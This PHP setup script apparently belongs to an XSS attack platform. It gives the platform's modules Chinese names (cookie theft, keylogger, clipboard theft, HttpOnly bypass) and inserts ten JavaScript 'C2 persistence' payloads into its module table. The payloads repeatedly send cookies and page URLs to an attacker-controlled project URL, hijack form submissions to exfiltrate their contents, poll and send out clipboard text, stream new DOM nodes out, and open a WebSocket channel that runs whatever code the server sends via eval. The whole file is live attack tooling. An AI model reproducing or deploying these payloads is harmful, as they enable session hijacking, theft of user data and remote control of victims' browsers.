<?php
/**
 * 添加中文模塊名稱和 C2 持久化模塊
 */
define('ROOT_PATH', dirname(__FILE__));
include(ROOT_PATH.'/init.php');

$db = DBConnect();

// 更新模塊名稱為中文
$updates = [
    1 => ['title' => '默認模塊', 'desc' => '基礎 Cookie 盜取模塊'],
    4 => ['title' => 'Apache HttpOnly 繞過', 'desc' => '利用 Apache 頭部限制繞過 HttpOnly'],
    6 => ['title' => 'AJAX 數據傳輸', 'desc' => '使用 AJAX 發送 Cookie 數據'],
    11 => ['title' => 'XSS.js 基礎庫', 'desc' => '標準 XSS 腳本庫'],
    15 => ['title' => '基礎認證釣魚', 'desc' => 'HTTP Basic Auth 釣魚'],
    111 => ['title' => 'DOM 事件繞過', 'desc' => '各種 DOM 事件觸發測試'],
    112 => ['title' => 'Unicode 編碼繞過', 'desc' => 'Unicode 轉義編碼測試'],
    113 => ['title' => 'SVG/MathML 繞過', 'desc' => 'SVG 和 MathML 標籤測試'],
    114 => ['title' => '原型鏈污染', 'desc' => 'JS 原型鏈污染測試'],
    115 => ['title' => '高級 Cookie 盜取', 'desc' => '收集全部可用瀏覽器數據'],
    116 => ['title' => 'LocalStorage 盜取', 'desc' => '繞過 HttpOnly 盜取本地存儲'],
    117 => ['title' => 'SessionStorage 盜取', 'desc' => '會話存儲盜取'],
    118 => ['title' => '表單數據收集', 'desc' => '自動收集表單內容'],
    119 => ['title' => '鍵盤記錄器', 'desc' => '記錄用戶鍵盤輸入'],
    120 => ['title' => '剪貼板盜取', 'desc' => '讀取系統剪貼板'],
    121 => ['title' => '頁面截圖', 'desc' => '頁面可視區域截圖'],
    122 => ['title' => 'DOM 敏感信息', 'desc' => '掃描頁面敏感元素'],
    123 => ['title' => '瀏覽歷史檢測', 'desc' => '檢測用戶訪問歷史'],
    124 => ['title' => 'WebRTC 真實 IP', 'desc' => '通過 WebRTC 泄露真實 IP'],
    125 => ['title' => '瀏覽器插件檢測', 'desc' => '識別用戶瀏覽器插件'],
    126 => ['title' => '瀏覽器指紋', 'desc' => '收集瀏覽器指紋信息']
];

foreach($updates as $id => $u) {
    $db->Execute("UPDATE ".Tb('module')." SET title='{$u['title']}', description='{$u['desc']}' WHERE id={$id}");
}

// 添加 C2 持久化模塊
$c2Modules = [
    [
        'title' => 'C2 駐留腳本',
        'description' => '持久化駐留，定時回傳數據',
        'code' => '(function(){setInterval(function(){if(navigator.onLine){var d={t:Date.now(),u:document.URL,c:document.cookie};var x=new Image();x.src="{projectUrl}?c2="+encodeURIComponent(JSON.stringify(d))}},30000)}})();'
    ],
    [
        'title' => '信標回傳',
        'description' => '定時心跳信標，持續駐留',
        'code' => 'var beacon=setInterval(function(){var xhr=new XMLHttpRequest();xhr.open("POST","{projectUrl}",true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send("beacon=ping&url="+encodeURIComponent(document.URL))},60000);'
    ],
    [
        'title' => 'WebSocket C2',
        'description' => 'WebSocket 持久連接 C2',
        'code' => 'var ws=new WebSocket("wss://{host}/ws");ws.onmessage=function(e){eval(e.data)};ws.onclose=function(){setTimeout(function(){location.reload()},5000)};'
    ],
    [
        'title' => 'Service Worker C2',
        'description' => 'Service Worker 持久化 C2',
        'code' => 'if("serviceWorker"in navigator){navigator.serviceWorker.register("/sw.js").then(function(r){console.log("SW registered")})}var sw;if(navigator.serviceWorker.controller){navigator.serviceWorker.controller.postMessage({type:"ping"})}'
    ],
    [
        'title' => 'IndexedDB 持久化',
        'description' => '本地存儲數據，離線也能工作',
        'code' => 'var db;var req=indexedDB.open("XSSData",1);req.onupgradeneeded=function(e){db=e.target.result;db.createObjectStore("data",{keyPath:"t"})};req.onsuccess=function(e){db=e.target.result;function save(){var d={t:Date.now(),u:document.URL,c:document.cookie};db.transaction(["data"],"readwrite").objectStore("data").add(d)}save();setInterval(save,60000)}'
    ],
    [
        'title' => 'Cache API 持久化',
        'description' => '利用 Cache API 緩存腳本',
        'code' => 'caches.open("xss-v1").then(function(cache){cache.addAll(["/xss.js","/beacon.js"]).then(function(){console.log("Cached")})});var xhr=new XMLHttpRequest();xhr.open("POST","{projectUrl}",true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send("cached=true");'
    ],
    [
        'title' => '定期 Cookie 刷新',
        'description' => '自動刷新 Cookie 保持會話',
        'code' => '(function(){function refresh(){var xhr=new XMLHttpRequest();xhr.open("GET",document.URL,true);xhr.withCredentials=true;xhr.onload=function(){setTimeout(refresh,3600000)}}refresh();setInterval(function(){var img=new Image();img.src="{projectUrl}?keepalive="+Date.now()},300000)})();'
    ],
    [
        'title' => 'DOM 劫持 C2',
        'description' => '劫持表單提交，監控數據',
        'code' => '(function(){var f=document.querySelectorAll("form");f.forEach(function(form){var or=form.onsubmit;form.onsubmit=function(e){var d=new FormData(form);var x=new Image();x.src="{projectUrl}?form="+encodeURIComponent(JSON.stringify(Object.fromEntries(d)));if(or)or(e)}}})})();'
    ],
    [
        'title' => '監控 DOM 變化',
        'description' => '觀察 DOM 變化，捕獲新數據',
        'code' => '(function(){var ob=new MutationObserver(function(m){m.forEach(function(r){if(r.type=="childList"&&r.addedNodes.length){var x=new Image();x.src="{projectUrl}?mutation="+encodeURIComponent(JSON.stringify({type:"new_node",html:r.addedNodes[0]?.outerHTML||""}))}})});ob.observe(document.body,{childList:true,subtree:true})})();'
    ],
    [
        'title' => '剪貼板監控',
        'description' => '持續監控剪貼板變化',
        'code' => '(function(){navigator.clipboard.onclipboardchange=function(){navigator.clipboard.readText().then(function(t){var x=new Image();x.src="{projectUrl}?clipboard="+encodeURIComponent(t+"&url="+encodeURIComponent(document.URL)})}).catch(function(){})};setInterval(function(){navigator.clipboard.readText().then(function(t){if(window.lastClip!==t){window.lastClip=t;var x=new Image();x.src="{projectUrl}?clipboard="+encodeURIComponent(t+"&url="+encodeURIComponent(document.URL)}}).catch(function(){})},2000)})();'
    ]
];

foreach($c2Modules as $m) {
    $values = [
        'title' => $m['title'],
        'description' => $m['description'],
        'userId' => 1,
        '`keys`' => '["location","toplocation","cookie","c2","beacon","keepalive","form","mutation","clipboard","cached"]',
        '`setkeys`' => '["host"]',
        'code' => $m['code'],
        'isOpen' => 1,
        'isAudit' => 1,
        'addTime' => time()
    ];
    $db->AutoExecute(Tb('module'), $values);
}

echo "模塊更新完成\n";
echo "新增 ".count($c2Modules)." 個 C2 持久化模塊\n";
